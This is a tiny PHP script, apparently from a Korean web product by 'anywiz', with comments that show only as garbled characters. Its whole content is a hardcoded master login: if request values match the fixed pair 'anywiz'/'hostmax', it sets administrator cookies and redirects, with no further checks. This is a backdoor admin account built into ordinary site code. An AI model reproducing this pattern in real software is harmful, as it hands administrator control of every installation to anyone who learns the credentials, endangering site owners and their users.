<?

// �ִ����� ������ ����[���� ���� ���Ǹ� ����]
if($admin_id == "anywiz" && $admin_pw == "hostmax"){
   
   setcookie("wiz_admin[id]", "anywiz", false, "/");
	setcookie("wiz_admin[name]", "�ִ�����", false, "/");
	setcookie("wiz_admin[email]", "help@anywiz.info", false, "/");

   Header("Location: ./");
   
}

?>